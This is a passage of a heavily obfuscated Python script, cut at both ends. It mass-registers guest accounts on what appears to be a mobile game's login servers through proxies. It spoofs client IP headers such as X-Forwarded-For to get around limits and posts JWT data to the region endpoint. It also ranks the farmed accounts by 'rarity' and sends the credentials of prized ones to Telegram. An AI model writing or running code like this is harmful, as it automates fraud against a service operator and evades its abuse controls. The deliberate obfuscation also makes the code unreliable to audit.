                lIlIIllIllIllIIIIIlllIII = 4247700
                continue
            if lIlIIllIllIllIIIIIlllIII == 4247700:
                response = request_via_proxy('POST', url, headers=headers, data=getattr(bytes, 'fromhex')(d))
                lIlIIllIllIllIIIIIlllIII = 6969504
                continue
            if lIlIIllIllIllIIIIIlllIII == 5156585:
                lIIllIIllIlIlIIIIlI = getattr(b'', 'join')(IIIIlIIlIIIlIl)
                lIlIIllIllIllIIIIIlllIII = 3813657
                continue
            if lIlIIllIllIllIIIIIlllIII == 2022586:
                headers = {'Accept-Encoding': 'gzip', 'Authorization': 'Bearer', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Expect': '100-continue', 'ReleaseVersion': 'OB54', 'User-Agent': getattr(IIllIllllllIIIIllI, 'get_ua')(), 'X-GA': 'v1 1', 'X-Unity-Version': '2018.4.11f1', 'X-Forwarded-For': llIIlIIlllIllIIl, 'X-Real-IP': llIIlIIlllIllIIl, 'X-Client-IP': llIIlIIlllIllIIl, 'X-Remote-IP': llIIlIIlllIllIIl, 'X-Remote-Addr': llIIlIIlllIllIIl}
                lIlIIllIllIllIIIIIlllIII = 2130025
                continue
            if lIlIIllIllIllIIIIIlllIII == 6408208:
                llIIlIIlllIllIIl = getattr(llIIllIlllIllIlIIII, 'get_ip_fast')()
                lIlIIllIllIllIIIIIlllIII = 2022586
                continue
            if lIlIIllIllIllIIIIIlllIII == 1294890:
                return {'account_id': 'N/A', 'jwt_token': ''}
                break
            if lIlIIllIllIllIIIIIlllIII == 7694535:
                lIlIIllIllIllIIIIIlllIII = 2130025
                continue
    except:
        return {'account_id': 'N/A', 'jwt_token': ''}

def save_jwt_to_server(region, jwt_token):
    if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][8] * 97 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][5] == 17007:
        IIllllIIIIIlIlIIIIllll = 6685364
        while True:
            if IIllllIIIIIlIlIIIIllll == 5713249:
                IIllllIIIIIlIlIIIIllll = 5832187
                continue
            if IIllllIIIIIlIlIIIIllll == 5832187:
                IIllllIIIIIlIlIIIIllll = 5832187
                continue
            if IIllllIIIIIlIlIIIIllll == 4038520:
                IIllllIIIIIlIlIIIIllll = 6685364
                continue
            if IIllllIIIIIlIlIIIIllll == 6685364:
                llllIIlIllllIIlllIII = 104416223 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][2]
                IIllllIIIIIlIlIIIIllll = 9967284
                continue
            if IIllllIIIIIlIlIIIIllll == 9967284:
                IIIIIllIlllIIIlIlll = (llllIIlIllllIIlllIII * 5 ^ 5662137) & 16777215
                IIllllIIIIIlIlIIIIllll = 7068403
                continue
            if IIllllIIIIIlIlIIIIllll == 3906709:
                IIllllIlIllIllIIIllllIl = sum(IlIlllIllIllllIlIl) + IIIIIllIlllIIIlIlll % 78 - llllIIlIllllIIlllIII
                break
            if IIllllIIIIIlIlIIIIllll == 7068403:
                IlIlllIllIllllIlIl = [IIIIIllIlllIIIlIlll >> 5 & 255 for llIlIIlIIllIlI in range(5)]
                IIllllIIIIIlIlIIIIllll = 3906709
                continue
    try:
        lllllllIlIIIIl = 7503587
        while True:
            if lllllllIlIIIIl == 9826577:
                lIIIllIIlIIIlIIlIIl = 'RU' if getattr(region, 'upper')() == 'CIS' else getattr(region, 'upper')()
                lllllllIlIIIIl = 3510931
                continue
            if lllllllIlIIIIl == 3510931:
                lIIlIlIIlIIIlIllIllIll = load_saved_data({1: lIIIllIIlIIIlIIlIIl})
                lllllllIlIIIIl = 2574818
                continue
            if lllllllIlIIIIl == 3292640:
                IIIlllIIlIIIIIlIIlIIIIl = getattr(bytes, 'fromhex')(llIlllIIIllIlIIlllIllIl)
                lllllllIlIIIIl = 1299036
                continue
            if lllllllIlIIIIl == 1596909:
                headers = {'User-Agent': getattr(IIllIllllllIIIIllI, 'get_ua')(), 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/x-www-form-urlencoded', 'Expect': '100-continue', 'Authorization': f'Bearer {jwt_token}', 'X-Unity-Version': '2018.4.11f1', 'X-GA': 'v1 1', 'ReleaseVersion': 'OB54', 'X-Forwarded-For': lllIIIIIllIlII, 'X-Real-IP': lllIIIIIllIlII, 'X-Client-IP': lllIIIIIllIlII, 'X-Remote-IP': lllIIIIIllIlII, 'X-Remote-Addr': lllIIIIIllIlII}
                lllllllIlIIIIl = 1963769
                continue
            if lllllllIlIIIIl == 5291561:
                lllllllIlIIIIl = 5291561
                continue
            if lllllllIlIIIIl == 1963769:
                request_via_proxy('POST', url, data=IIIlllIIlIIIIIlIIlIIIIl, headers=headers)
                break
            if lllllllIlIIIIl == 1752664:
                lllllllIlIIIIl = 3510931
                continue
            if lllllllIlIIIIl == 1299036:
                lllIIIIIllIlII = getattr(llIIllIlllIllIlIIII, 'get_ip_fast')()
                lllllllIlIIIIl = 1596909
                continue
            if lllllllIlIIIIl == 1245640:
                lllllllIlIIIIl = 1752664
                continue
            if lllllllIlIIIIl == 2574818:
                llIlllIIIllIlIIlllIllIl = encrypt_hex_payload(getattr(lIIlIlIIlIIIlIllIllIll, 'hex')())
                lllllllIlIIIIl = 3292640
                continue
            if lllllllIlIIIIl == 7503587:
                url = 'https://loginbp.common.ggbluefox.com/ChooseRegion' if getattr(region, 'upper')() in ['ME', 'TH'] else 'https://loginbp.ggblueshark.com/ChooseRegion'
                lllllllIlIIIIl = 9826577
                continue
    except:
        pass

def process_account(region, account_name, password_prefix, total_accounts, thread_id, is_ghost=False, use_telegram=False, rare_only=False):
    global lIIlIIllllIIlII, IIllllIIIlIlIIlIlIlll, lIIIIIlIlIIIIlIlIIlIlI, lIIIllIlIIllllIIIlIIllI, lIlllIllIlllIIIl, normal
    IIIlIlIlllIIIllIl = 4386765
    while True:
        if IIIlIlIlllIIIllIl == 9431493:
            lIIIIlIIIlIIlIII = getattr(IlIlIlllllIlIIlllIIlIII, 'get')('retries', 2)
            IIIlIlIlllIIIllIl = 7077331
            continue
        if IIIlIlIlllIIIllIl == 2691888:
            if IlIIIlllllIIlllII or not proxy_monitor():
                return None
            IIIlIlIlllIIIllIl = 6707327
            continue
        if IIIlIlIlllIIIllIl == 9344127:
            return None
            break
        if IIIlIlIlllIIIllIl == 7077331:
            for IlIIIIlIllIlIIlllIIlIIl in range(lIIIIlIIIlIIlIII + 1):
                try:
                    lIIIlIllIIllIIlIlIIIlll = register_guest_account(region, account_name, password_prefix, is_ghost)
                    if not lIIIlIllIIllIIlIlIIIlll:
                        if IlIIIIlIllIlIIlllIIlIIl < lIIIIlIIIlIIlIII:
                            getattr(IlllllIIllIIllIIll, 'sleep')(0.5 * (IlIIIIlIllIlIIlllIIlIIl + 1))
                            continue
                        return None
                    if getattr(lIIIlIllIIllIIlIlIIIlll, 'get')('account_id', 'N/A') == 'N/A':
                        if IlIIIIlIllIlIIlllIIlIIl < lIIIIlIIIlIIlIII:
                            getattr(IlllllIIllIIllIIll, 'sleep')(0.5 * (IlIIIIlIllIlIIlllIIlIIl + 1))
                            continue
                        return None
                    lIIIlIllIIllIIlIlIIIlll['thread_id'] = thread_id
                    IlIllIIlIlIIlIlllllI, rarity_level, reason, IIIlIlllIlIllllIIll = IllIIIlIlIlllII(lIIIlIllIIllIIlIlIIIlll)
                    if rare_only:
                        if rarity_level not in ['RARE', 'EPIC', 'MYTHIC', 'LEGENDARY']:
                            return None
                    with lIlllIlIlIIIlIl:
                        lIIlIIllllIIlII += 1
                    if not IlIllIIlIlIIlIlllllI:
                        normal += 1
                    IllIIlIllIlIlIlIIIIl(lIIIlIllIIllIIlIlIIIlll, 'GHOST' if is_ghost else region, is_ghost)
                    if getattr(lIIIlIllIIllIIlIlIIIlll, 'get')('jwt_token'):
                        llllllIIIIIIIlIllII(lIIIlIllIIllIIlIlIIIlll, lIIIlIllIIllIIlIlIIIlll['jwt_token'], 'GHOST' if is_ghost else region, is_ghost)
                    if IlIllIIlIlIIlIlllllI:
                        with lIlllIlIlIIIlIl:
                            IIllllIIIlIlIIlIlIlll += 1
                            if rarity_level == 'LEGENDARY':
                                lIIIIIlIlIIIIlIlIIlIlI += 1
                                if use_telegram and getattr(IIllIlIIIIIIIIl, 'connected'):
                                    getattr(IIllIlIIIIIIIIl, 'send_legendary')(lIIIlIllIIllIIlIlIIIlll['uid'], lIIIlIllIIllIIlIlIIIlll['account_id'], lIIIlIllIIllIIlIlIIIlll['password'], lIIIlIllIIllIIlIlIIIlll['name'], IIIlIlllIlIllllIIll)
                            elif rarity_level == 'MYTHIC':
                                lIIIllIlIIllllIIIlIIllI += 1
                            elif rarity_level == 'EPIC':
                                lIlllIllIlllIIIl += 1
                        IllIIIlIIIlIIllIIIIlIIlI(lIIIlIllIIllIIlIlIIIlll, rarity_level, reason, IIIlIlllIlIllllIIll, is_ghost)
                    getattr(lIIllIIlIIIIIllllllIII, 'print_account')(lIIIlIllIIllIIlIlIIIlll, total_accounts, score=IIIlIlllIlIllllIIll if IlIllIIlIlIIlIlllllI else None, rarity_level=rarity_level if IlIllIIlIlIIlIlllllI else None, show_common=True)
                    return lIIIlIllIIllIIlIlIIIlll
                except Exception as e:
                    if IlIIIIlIllIlIIlllIIlIIl < lIIIIlIIIlIIlIII:
                        getattr(IlllllIIllIIllIIll, 'sleep')(1 * (IlIIIIlIllIlIIlllIIlIIl + 1))
                        continue
                    else:
                        return None
            IIIlIlIlllIIIllIl = 9344127
            continue
        if IIIlIlIlllIIIllIl == 6707327:
            with lIlllIlIlIIIlIl:
                if lIIlIIllllIIlII >= total_accounts:
                    return None
            IIIlIlIlllIIIllIl = 9431493
            continue
        if IIIlIlIlllIIIllIl == 3153772:
            IIIlIlIlllIIIllIl = 3153772
            continue
        if IIIlIlIlllIIIllIl == 4386765:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][4] ^ 5 == 412:
                IIIIlIIIIllIlIIlllIlIIIl = 3207660
                while True:
                    if IIIIlIIIIllIlIIlllIlIIIl == 8201033:
                        IIIIlIIIIllIlIIlllIlIIIl = 9796866
                        continue
                    if IIIIlIIIIllIlIIlllIlIIIl == 9157443:
                        IllIllIIllIllIII = sum(llIIIIIIlIIIIlII) + lllIIIlllllIIlIllIII % 39 - lIIIIlIlIlIIlIl
                        break
                    if IIIIlIIIIllIlIIlllIlIIIl == 3337939:
                        IIIIlIIIIllIlIIlllIlIIIl = 3207660
                        continue
                    if IIIIlIIIIllIlIIlllIlIIIl == 3207660:
                        lIIIIlIlIlIIlIl = 188369472 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][30]
                        IIIIlIIIIllIlIIlllIlIIIl = 5847057
                        continue
                    if IIIIlIIIIllIlIIlllIlIIIl == 5847057:
                        lllIIIlllllIIlIllIII = (lIIIIlIlIlIIlIl * 4 ^ 3874210) & 65535
                        IIIIlIIIIllIlIIlllIlIIIl = 9796866
                        continue
                    if IIIIlIIIIllIlIIlllIlIIIl == 9796866:
                        llIIIIIIlIIIIlII = [lllIIIlllllIIlIllIII >> 4 & 255 for IIllllllIIlIlIIIllIll in range(4)]
                        IIIIlIIIIllIlIIlllIlIIIl = 9157443
                        continue
            IIIlIlIlllIIIllIl = 2691888
            continue
        if IIIlIlIlllIIIllIl == 2650422:
            IIIlIlIlllIIIllIl = 9431493
            continue
        if IIIlIlIlllIIIllIl == 2190402:
            IIIlIlIlllIIIllIl = 7077331
            continue

def run_parallel_workers():
    global lIIlIIllllIIlII, IIllllIIIlIlIIlIlIlll, lIIIIIlIlIIIIlIlIIlIlI, lIIIllIlIIllllIIIlIIllI, lIlllIllIlllIIIl, normal
    global lIIllIIlIIIIIllllllIII
    IllIlIIlIIIllIIlIllIll = 9436057
    while True:
        if IllIlIIlIIIllIIlIllIll == 3668595:
            lIIIllIlIIllllIIIlIIllI = 0
            IllIlIIlIIIllIIlIllIll = 3048865
            continue
        if IllIlIIlIIIllIIlIllIll == 1885858:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}⚡ GENERATING ACCOUNTS ⚡{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 1105625
            continue
        if IllIlIIlIIIllIIlIllIll == 9666639:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}10{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'GREEN2')}SAC (es)    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'PURPLE_GLOW')}11{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'PURPLE')}GHOST Mode {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}00{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'RED1')}Back    {getattr(IlIIIIIIlIIlIlll, 'BLACK')}──────────────────╢.   {getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 6700557
            continue
        if IllIlIIlIIIllIIlIllIll == 7156038:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'CYAN_GLOW')}07{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'CYAN')}PK (ur)     {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'CYAN_GLOW')}08{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'CYAN')}TW (zh)    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'CYAN_GLOW')}09{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'CYAN')}CIS (ru)  {getattr(IlIIIIIIlIIlIlll, 'BLACK')} {getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 9666639
            continue
        if IllIlIIlIIIllIIlIllIll == 8092346:
            if not proxy_monitor():
                print(f'{IIlllIlIlllllIlllllllll}❌ License tidak valid! Program berhenti.{llIIllllllIlllIlIIll}')
                return
            IllIlIIlIIIllIIlIllIll = 4968100
            continue
        if IllIlIIlIIIllIIlIllIll == 2363269:
            input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}Press Enter to continue...{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            IllIlIIlIIIllIIlIllIll = 9330948
            continue
        if IllIlIIlIIIllIIlIllIll == 4102060:
            get_runtime_config()
            IllIlIIlIIIllIIlIllIll = 1806877
            continue
        if IllIlIIlIIIllIIlIllIll == 9076893:
            IllIlIIlIIIllIIlIllIll = 4077151
            continue
        if IllIlIIlIIIllIIlIllIll == 2907656:
            llIllIllIIIllIl = getattr(IlllllIIllIIllIIll, 'time')() - lllIlIIlIIlllIIII
            IllIlIIlIIIllIIlIllIll = 8791195
            continue
        if IllIlIIlIIIllIIlIllIll == 9297516:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_alt(lIlIlIlllIlIlIllIlIII, IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 7107365
            continue
        if IllIlIIlIIIllIIlIllIll == 4698028:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Rare      {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}{IIllllIIIlIlIIlIlIlll}{getattr(IlIIIIIIlIIlIlll, 'RST')} (Score 7-10){getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 3172253
            continue
        if IllIlIIlIIIllIIlIllIll == 7569672:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}04{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}VN (vi)     {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}05{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}TH (th)    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}06{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}BD (bn)  {getattr(IlIIIIIIlIIlIlll, 'BLACK')}───────────────────╢  {getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 7156038
            continue
        if IllIlIIlIIIllIIlIllIll == 9273618:
            IllIlIIlIIIllIIlIllIll = 6613114
            continue
        if IllIlIIlIIIllIIlIllIll == 7615943:
            lIIlIIllllIIlII = 0
            IllIlIIlIIIllIIlIllIll = 8168672
            continue
        if IllIlIIlIIIllIIlIllIll == 2880138:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            IllIlIIlIIIllIIlIllIll = 2363269
            continue
        if IllIlIIlIIIllIIlIllIll == 7847098:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_alt(llllIllllllIlIIIIIIIIl, IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 5915645
            continue
        if IllIlIIlIIIllIIlIllIll == 7609295:
            lllIlIIlIIlllIIII = getattr(IlllllIIllIIllIIll, 'time')()
            IllIlIIlIIIllIIlIllIll = 9763884
            continue
        if IllIlIIlIIIllIIlIllIll == 8168672:
            IIllllIIIlIlIIlIlIlll = 0
            IllIlIIlIIIllIIlIllIll = 2760915
            continue
        if IllIlIIlIIIllIIlIllIll == 9763884:
            lIllllllIlIlIlIIllIIIlll = __import__('concurrent.futures', fromlist=['ThreadPoolExecutor', 'as_completed'])
            llIIIIIlllllIIIIlIl = getattr(lIllllllIlIlIlIIllIIIlll, 'ThreadPoolExecutor')
            IlIIllIlIlIlIlIIIIlI = getattr(lIllllllIlIlIlIIllIIIlll, 'as_completed')
            IllIlIIlIIIllIIlIllIll = 2518337
            continue
        if IllIlIIlIIIllIIlIllIll == 5915645:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            IllIlIIlIIIllIIlIllIll = 6210619
            continue
        if IllIlIIlIIIllIIlIllIll == 4284342:
            while True:
                try:
                    print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}🎯 TOTAL ACCOUNTS{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}')
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
                    IllIlIllllIIllIIlIIlll = int(input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Total Accounts: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'))
                    print(getattr(IlIIIIIIlIIlIlll, 'RST'), end='')
                    if IllIlIllllIIllIIlIIlll > 0:
                        break
                except ValueError:
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}{getattr(UI, 'CROSS')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Enter number')
                except KeyboardInterrupt:
                    IlIIlIlIlIIIIllIllIIll()
            IllIlIIlIIIllIIlIllIll = 4077151
            continue
        if IllIlIIlIIIllIIlIllIll == 7074658:
            while True:
                try:
                    IIllIIlllIlIlIllIllllIl = getattr(input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Choose region [1-11/00/000]: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
                    print(getattr(IlIIIIIIlIIlIlll, 'RST'), end='')
                    IlIIlIlIlllIIIlIIlIIIII = {'1': 'ME', '2': 'IND', '3': 'ID', '4': 'VN', '5': 'TH', '6': 'BD', '7': 'PK', '8': 'TW', '9': 'CIS', '10': 'SAC'}
                    if IIllIIlllIlIlIllIllllIl == '00':
                        return
                    elif IIllIIlllIlIlIllIllllIl == '000':
                        IlIIlIlIlIIIIllIllIIll()
                    elif IIllIIlllIlIlIllIllllIl == '11':
                        IlIlIIlIlIIIllIlIlIllIl = True
                        lIIllllIlllIII = 'BD'
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'PURPLE_GLOW')}GHOST Mode Activated{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                        break
                    elif IIllIIlllIlIlIllIllllIl in IlIIlIlIlllIIIlIIlIIIII:
                        lIIllllIlllIII = IlIIlIlIlllIIIlIIlIIIII[IIllIIlllIlIlIllIllllIl]
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Selected: {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}{lIIllllIlllIII}{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                        break
                    else:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}{getattr(UI, 'CROSS')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Invalid option')
                except KeyboardInterrupt:
                    IlIIlIlIlIIIIllIllIIll()
            IllIlIIlIIIllIIlIllIll = 9618537
            continue
        if IllIlIIlIIIllIIlIllIll == 7290157:
            llllIllllllIlIIIIIIIIl = f'  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Mode      {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {(getattr(IlIIIIIIlIIlIlll, 'RED_GLOW') if lIIlllIIIIIllIIllIIlI else getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW'))}{('RARE ONLY' if lIIlllIIIIIllIIllIIlI else 'ALL ACCOUNTS')}{'          '}{getattr(IlIIIIIIlIIlIlll, 'RST')}'
            IllIlIIlIIIllIIlIllIll = 7847098
            continue
        if IllIlIIlIIIllIIlIllIll == 4046435:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝\n')
            IllIlIIlIIIllIIlIllIll = 7615943
            continue
        if IllIlIIlIIIllIIlIllIll == 6299871:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            IllIlIIlIIIllIIlIllIll = 1885858
            continue
        if IllIlIIlIIIllIIlIllIll == 1776846:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Generated {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}{lIIlIIllllIIlII}{getattr(IlIIIIIIlIIlIlll, 'RST')}/{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}{IllIlIllllIIllIIlIIlll}{getattr(IlIIIIIIlIIlIlll, 'RST')} accounts{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 7918871
            continue
        if IllIlIIlIIIllIIlIllIll == 6160475:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            IllIlIIlIIIllIIlIllIll = 8130347
            continue
        if IllIlIIlIIIllIIlIllIll == 4418794:
            while True:
                lllllIIIlIllllllIIlIIl = getattr(input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Pilih mode [1/2]: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
                if lllllIIIlIllllllIIlIIl == '1':
                    lIIlllIIIIIllIIllIIlI = False
                    break
                elif lllllIIIlIllllllIIlIIl == '2':
                    lIIlllIIIIIllIIllIIlI = True
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}✅ Rare Only aktif – hanya akun Rare+ yang akan disimpan{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                    getattr(IlllllIIllIIllIIll, 'sleep')(1)
                    break
                else:
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}❌ Pilihan tidak valid{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            IllIlIIlIIIllIIlIllIll = 2989292
            continue
        if IllIlIIlIIIllIIlIllIll == 5498335:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}🎯 GENERATE MODE{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}')
            IllIlIIlIIIllIIlIllIll = 3448648
            continue
        if IllIlIIlIIIllIIlIllIll == 7058654:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Mode: {getattr(IlIIIIIIlIIlIlll, 'GREEN2')}ALL ACCOUNTS (Normal + Rare){getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 8243833
            continue
        if IllIlIIlIIIllIIlIllIll == 5908217:
            while True:
                try:
                    lIlIIlIIllIllllIlIIlllIl = getattr(input(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Pass prefix [JONZZ]: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
                    print(getattr(IlIIIIIIlIIlIlll, 'RST'), end='')
                    if not lIlIIlIIllIllllIlIIlllIl:
                        lIlIIlIIllIllllIlIIlllIl = 'JONZZ'
                    break
                except KeyboardInterrupt:
                    IlIIlIlIlIIIIllIllIIll()
            IllIlIIlIIIllIIlIllIll = 4284342
            continue
        if IllIlIIlIIIllIIlIllIll == 2493736:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}')
            IllIlIIlIIIllIIlIllIll = 5459107
            continue
        if IllIlIIlIIIllIIlIllIll == 6210619:
            getattr(lIlIlIIllllllllllIlII, 'start')()
            IllIlIIlIIIllIIlIllIll = 6299871
            continue
        if IllIlIIlIIIllIIlIllIll == 8117029:
